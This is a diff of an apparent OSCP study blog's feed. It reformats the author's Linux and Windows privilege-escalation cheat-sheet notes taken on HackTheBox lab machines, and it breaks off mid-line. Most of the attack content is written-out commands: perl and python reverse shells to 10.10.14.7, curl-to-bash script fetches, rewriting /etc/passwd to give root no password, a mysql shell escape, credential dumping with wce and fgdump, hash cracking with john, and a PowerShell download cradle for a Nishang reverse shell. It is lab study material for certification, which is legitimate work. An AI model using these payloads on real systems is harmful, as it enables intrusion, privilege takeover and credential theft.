-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sudo -u anotheruser command run sommand as another user&lt;/span&gt;
-&lt;span class="err"&gt;sudo -u scriptmanager bash -i #run shell as user scriptmanager&lt;/span&gt;
-&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
+BY HAND &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;sudo -l # view users rights has to be tried first for all linux privesc&lt;/li&gt;
+&lt;li&gt;rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash &amp;gt; /etc/passwd → su&lt;/li&gt;
+&lt;li&gt;bash_history&lt;/li&gt;
+&lt;li&gt;find / -perm -4000 2&amp;gt;/dev/null # SUID files - detect by date?&lt;/li&gt;
+&lt;li&gt;Do all cronjobs look normal and do you have write access to any??&lt;/li&gt;
+&lt;li&gt;ps aux | grep root == john mysql -u root&lt;/li&gt;
+&lt;li&gt;If webserver poke around database&lt;/li&gt;
+&lt;li&gt;Look at original nmap scan for other shite running (nmap localhost)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo -u anotheruser _command &lt;span class="c1"&gt;# run _command as another user&lt;/span&gt;
+sudo -u scriptmanager bash -i &lt;span class="c1"&gt;# run shell as user scriptmanager&lt;/span&gt;
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
+&lt;p&gt;DOWNLOAD ALL LINUX ENUM FILES TO VICTIM &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /opt/linux_privesc
 python -m SimpleHTTPServer
-wget -r 10.10.14.7:8000
-curl 10.10.14.7/LinEnum | bash # pipe into bash
-or save to victim
-linEnum.sh has a -t flag for thorough!!
+wget -r &lt;span class="m"&gt;10&lt;/span&gt;.10.14.7:8000
+curl &lt;span class="m"&gt;10&lt;/span&gt;.10.14.7/LinEnum &lt;span class="p"&gt;|&lt;/span&gt; bash &lt;span class="c1"&gt;# pipe into bash&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;or save to victim&lt;/p&gt;
+&lt;p&gt;linEnum.sh has a -t flag for thorough!!
 make a thorough linEnum script bu putting thorough = 1 at top of script
 KERNEL EXPLOITS i686 = 32bit
 x86_64 = 64bit
@@ -512,158 +686,205 @@ Get Linux version from Apache version etc... Launchpad?
 linux exploit suggester
 the exploit will give linux version + exploitable file
 check your own file version
-eg
-ldd --version
+eg&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ldd --version
 cat /etc/lsb-release
-Can ignore warnings on gcc compiles
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Can ignore warnings on gcc compiles
 LINUX VERSIONS
-ubuntu 2.2.22 apache → launchpad link → prcise
-Google ubuntu releases wiki.ubuntu.com/Releases → End of Lifes?
-nmap --script vuln -oA nmap/vulns 10.10.10.79
-Freebsd uses csh shell
+ubuntu 2.2.22 apache ... launchpad link ... precise
+Google ubuntu releases wiki.ubuntu.com/Releases → End of Lifes?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap --script vuln -oA nmap/vulns &lt;span class="m"&gt;10&lt;/span&gt;.10.10.79
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Freebsd uses csh shell
 LINUX PASSWORDS unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 42/67
-WRITABLE /etc/passwd (Bank) Create encrypted password and place in passwd file
-openssl passwd --help
+WRITABLE /etc/passwd (Bank) Create encrypted password and place in passwd file&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openssl passwd --help
 openssl passwd dan
 dfVJQnZOraiAw
-openssl passwd -1 dan # specifies md5
+openssl passwd -1 dan &lt;span class="c1"&gt;# specifies md5&lt;/span&gt;
 vi /etc/passwd
-replace
-root:x:0:0:root:/root:/bin/bash
-with
-root:dfVJQnZOraiAw:0:0:root:/root:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;replace&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;with&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root:dfVJQnZOraiAw:0:0:root:/root:/bin/bash
 su root
 Password: dan
-SUID (Bank) find / -perm -4000 2&amp;gt;/dev/null
+SUID &lt;span class="o"&gt;(&lt;/span&gt;Bank&lt;span class="o"&gt;)&lt;/span&gt; find / -perm -4000 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
 /var/htb/bin/emergency
-$ ls -la /var/htb/bin/emergency
--rwsr-xr-x 1 root root 112204 Jun 14 2017 /var/htb/bin/emergency
-Just run the binary and gain root
-/var/htb/bin/emergency
-That was simple (will often need to edit binary)
-ESCALATE VIA MYSQL ROOT credentials → go into mysql as root then drop ito a shell to pwn box
-mysql -u root -p
-Enter password: !@#S3cur3P4ssw0rd!@#
-Create shell in mysql
-! /bin/sh
-DIDNT ESCALATE
-sudo -l sudo -l
-User shelly may run the following commands on Shocker:
-(root) NOPASSWD: /usr/bin/perl
-Get the pentest monkey perl shell
-Important to add sudo before
-sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.7";
-$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
-{open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'
-A cronjob (of sorts) test.py owned by us (we are scriptmanager). But note the output (test.txt) is root.
+ls -la /var/htb/bin/emergency
+-rwsr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;112204&lt;/span&gt; Jun &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;2017&lt;/span&gt; /var/htb/bin/emergency
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Just run the binary and gain root&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/var/htb/bin/emergency
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;That was simple (will often need to edit binary)
+ESCALATE VIA MYSQL ROOT credentials ... go into mysql as root then drop ito a shell to pwn box&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mysql -u root -p
+Enter password: !@S3cur3P4ssw0rd!@
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Create shell in mysql&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="se"&gt;\!&lt;/span&gt; /bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;DIDNT ESCALATE&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo -l sudo -l
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;User shelly may run the following commands on Shocker:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get the pentest monkey perl shell
+Important to add sudo before&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo /usr/bin/perl -e &lt;span class="s1"&gt;&amp;#39;use Socket;$i=&amp;quot;10.10.14.7&amp;quot;;&lt;/span&gt;
+&lt;span class="s1"&gt;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&lt;/span&gt;
+&lt;span class="s1"&gt;{open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;A cronjob (of sorts) test.py owned by us (we are scriptmanager). But note the output (test.txt) is root.
 Goody gumdrops.
-Put in a new test.py.
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",
-4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-Open listener on KALI: nc -nlvp 4444
-Serve it it to victim's scripts folder
-Let the cronjob run → shell
+Put in a new test.py.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nn"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nn"&gt;os&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.7&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;-i&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Open listener on KALI: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -nlvp &lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Serve it it to victim's scripts folder
+Let the cronjob run shell
 43/67
-RESTRICTED BASH To view what we CAN run
-monitor@waldo:~$ echo $PATH
+RESTRICTED BASH To view what we CAN run&lt;/p&gt;
+&lt;h3&gt;ON WALDO&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$PATH&lt;/span&gt;
 /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
 ls /home/monitor/bin
 ls most red rnano
 ls -la /home/monitor/app-dev
-total 2236
-drwxrwx--- 3 app-dev monitor 4096 May 3 2018 .
-drwxr-x--- 5 root monitor 4096 Jul 24 2018 ..
--rwxrwx--- 1 app-dev monitor 13704 Jul 24 2018 logMonitor
-rwx-able if we are in monitor group?
+total &lt;span class="m"&gt;2236&lt;/span&gt;
+drwxrwx--- &lt;span class="m"&gt;3&lt;/span&gt; app-dev monitor &lt;span class="m"&gt;4096&lt;/span&gt; May &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .
+drwxr-x--- &lt;span class="m"&gt;5&lt;/span&gt; root monitor &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; ..
+-rwxrwx--- &lt;span class="m"&gt;1&lt;/span&gt; app-dev monitor &lt;span class="m"&gt;13704&lt;/span&gt; Jul &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; logMonitor
+&lt;span class="c1"&gt;# rwx-able if we are in monitor group?&lt;/span&gt;
 rnano /etc/group
-monitor:x:1001: ← yes
-We will copy /bin/bash and paste it over logMonitor
-red /bin/bash ← restricted edit
-1099016
+monitor:x:1001: &lt;span class="c1"&gt;# yes&lt;/span&gt;
+&lt;span class="c1"&gt;# We will copy /bin/bash and paste it over logMonitor&lt;/span&gt;
+red /bin/bash &lt;span class="c1"&gt;# restricted edit&lt;/span&gt;
+&lt;span class="m"&gt;1099016&lt;/span&gt;
 w app-dev/logMonitor &amp;lt;- write to logMonitorcd ~
-1099016
+&lt;span class="m"&gt;1099016&lt;/span&gt;
 q
 logMonitor
-tmp.tUiSCVyRTR: dircolors: command not found
-We now have /bin/bash BUT we can still only do whats in our path. BUT... we can echo a normal path (from kali) and set it on
-Waldo
-ON KALI
-echo $PATH
+tmp.tUiSCVyRTR: dircolors: &lt;span class="nb"&gt;command&lt;/span&gt; not found
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We now have /bin/bash BUT we can still only do whats in our path. BUT... we can echo a normal path (from kali) and set it on Waldo&lt;/p&gt;
+&lt;h3&gt;ON KALI&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$PATH&lt;/span&gt;
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
-ON WALDO
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
-GET LINENUM WITH CURL
-root@kali:/opt/linux_privesc# python -m SimpleHTTPServer
-Serving HTTP on 0.0.0.0 port 8000 ...
-curl 10.10.14.11:8000/linEnumThorough.sh | bash
-[+] Files with POSIX capabilities set:
-/usr/bin/tac = cap_dac_read_search+ei
-/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
-[+] Capabilities associated with the current user:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;ON WALDO&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;ON KALI&lt;/h3&gt;
+&lt;p&gt;Get &lt;code&gt;linenum&lt;/code&gt; with &lt;code&gt;curl&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python -m SimpleHTTPServer
+Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;8000&lt;/span&gt; ...
+curl &lt;span class="m"&gt;10&lt;/span&gt;.10.14.11:8000/linEnumThorough.sh &lt;span class="p"&gt;|&lt;/span&gt; bash
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Files with POSIX capabilities set:
+/usr/bin/tac &lt;span class="o"&gt;=&lt;/span&gt; cap_dac_read_search+ei
+/home/monitor/app-dev/v0.1/logMonitor-0.1 &lt;span class="o"&gt;=&lt;/span&gt; cap_dac_read_search+ei
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Capabilities associated with the current user:
 cap_dac_read_search ←
-[+] Permissions of files with the same capabilities associated with the current user:
--rwxr-xr-x 1 root root 39752 Feb 22 2017 /usr/bin/tac
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Permissions of files with the same capabilities associated with the current user:
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;39752&lt;/span&gt; Feb &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2017&lt;/span&gt; /usr/bin/tac
 man capabilities
 CAP_DAC_READ_SEARCH
-* Bypass file read permission checks and directory read and execute permission checks;&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Windows Privilege Escalation</title><link href="/windows-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/windows-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
-&lt;span class="err"&gt;...&lt;/span&gt;
-&lt;span class="c"&gt;Everyone: (I)(F)&lt;/span&gt;
+* Bypass file &lt;span class="nb"&gt;read&lt;/span&gt; permission checks and directory &lt;span class="nb"&gt;read&lt;/span&gt; and execute permission checks&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Windows Privilege Escalation</title><link href="/windows-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/windows-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;icacls&lt;/span&gt; &lt;span class="n"&gt;scsiaccess&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+&lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="c"&gt;# Everyone: (I)(F)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;crosscompile useradd.c
-i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
-wce -w
-fgdump.exe
-type 127.0.0.1.pwdump
-john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-Is there python on dev windows machine
-Use pyinstaller on dev windows machine …&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
-&lt;span class="err"&gt;...&lt;/span&gt;
-&lt;span class="c"&gt;Everyone: (I)(F)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;crosscompile&lt;/span&gt; &lt;span class="n"&gt;useradd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;span class="n"&gt;i686-w64-mingw32-gcc&lt;/span&gt; &lt;span class="n"&gt;-o&lt;/span&gt; &lt;span class="n"&gt;scsiaccess&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;useradd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;span class="n"&gt;wce&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt;
+&lt;span class="n"&gt;fgdump&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+&lt;span class="nb"&gt;type &lt;/span&gt;&lt;span class="n"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pwdump&lt;/span&gt;
+&lt;span class="n"&gt;john&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-wordlist&lt;/span&gt;&lt;span class="p"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;rockyou&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="n"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pwdump&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;crosscompile useradd.c
-i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
-wce -w
-fgdump.exe
-type 127.0.0.1.pwdump
-john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-Is there python on dev windows machine
-Use pyinstaller on dev windows machine
-python pyinstaller.py --onefile ms11-080.py
-Check for powershell
-powershell whoami
-whaomi /priv
-cmdkey /list
-run an exploit suggesters
-If web server poke around databasel
-Check if I can write in folder
-echo PleaseSubsribe &amp;gt; test
-1. Nishang
-2. unicorn → meterpreter from a standard shell
-UPGRADE TO NISHANG 1. Locate the PS &amp;gt; Invoke...reverse shell line in script and put at bottom so it executes in memory after transfer
-2. Server python -m SimpleHTTPServer 80
-3. powershell “IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')”
-net user dan dan /add; net local
-UNICORN
-Exploit suggesters • Sherlock.ps1
-• Powerup.ps1 → service misconfigs
-• Exploit suggester ./windows-exploit-suggester.py
-python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
-• jaws-enum.ps1
-• Empire??
-Sherlock.ps1
-windows-exploit-suggester.py
-Empire
-PowerUp.ps1
-46/67
-locate PowerUp.ps1. Copy then add “Invoke-AllChecks” to end
+&lt;p&gt;Is there python on dev windows machine
+Use pyinstaller on dev windows machine …&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;icacls&lt;/span&gt; &lt;span class="n"&gt;scsiaccess&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+&lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="c"&gt;# Everyone: (I)(F)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;crosscompile&lt;/span&gt; &lt;span class="n"&gt;useradd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;span class="n"&gt;i686-w64-mingw32-gcc&lt;/span&gt; &lt;span class="n"&gt;-o&lt;/span&gt; &lt;span class="n"&gt;scsiaccess&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;useradd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;span class="n"&gt;wce&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt;
+&lt;span class="n"&gt;fgdump&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+&lt;span class="nb"&gt;type &lt;/span&gt;&lt;span class="n"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pwdump&lt;/span&gt;
+&lt;span class="n"&gt;john&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-wordlist&lt;/span&gt;&lt;span class="p"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;rockyou&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="n"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span 